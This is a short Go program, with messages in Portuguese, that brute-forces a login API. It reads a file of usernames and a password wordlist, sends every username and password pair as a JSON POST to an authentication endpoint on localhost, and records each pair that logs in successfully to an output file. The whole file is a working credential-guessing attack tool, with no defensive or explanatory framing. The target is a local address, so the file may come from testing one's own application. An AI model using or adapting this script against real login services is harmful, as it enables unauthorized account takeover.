package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

func main() {
	userFile, err := os.Open("usersValidos.txt")
	if err != nil {
		fmt.Println("Erro ao abrir arquivo de usuários:", err)
		return
	}
	defer userFile.Close()

	passwordFile, err := os.Open("wordlists/pass.txt")
	if err != nil {
		fmt.Println("Erro ao abrir arquivo de senhas:", err)
		return
	}
	defer passwordFile.Close()

	url := "http://localhost:5127/api/authentication/login"

	outFile, err := os.Create("SUCESSO.txt")
	if err != nil {
		fmt.Println("Erro ao criar arquivo de saída:", err)
		return
	}
	defer outFile.Close()

	userScanner := bufio.NewScanner(userFile)

	for userScanner.Scan() {
		user := userScanner.Text()

		passwordFile.Seek(0, 0)
		passwordScanner := bufio.NewScanner(passwordFile)

		for passwordScanner.Scan() {
			password := passwordScanner.Text()

			requestData := map[string]string{
				"login":    user,
				"password": password,
			}
			jsonData, err := json.Marshal(requestData)
			if err != nil {
				fmt.Println("Erro ao criar JSON da requisição:", err)
				return
			}

			req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
			if err != nil {
				fmt.Println("Erro ao criar requisição POST:", err)
				return
			}
			req.Header.Set("Content-Type", "application/json")

			client := &http.Client{}
			resp, err := client.Do(req)
			if err != nil {
				fmt.Println("Erro ao realizar requisição POST:", err)
				return
			}
			defer resp.Body.Close()

			fmt.Printf("Testando: usuário: %s, senha: %s\n", user, password)
			
			if resp.StatusCode == http.StatusOK {
				message := fmt.Sprintf("Login bem sucedido: usuário %s, senha %s\n", user, password)
				if _, err := outFile.WriteString(message); err != nil {
					fmt.Println("Erro ao escrever no arquivo de saída:", err)
					return
				}
			}
		}
	}

	if err := userScanner.Err(); err != nil {
		fmt.Println("Erro ao ler arquivo de usuários:", err)
	}
}
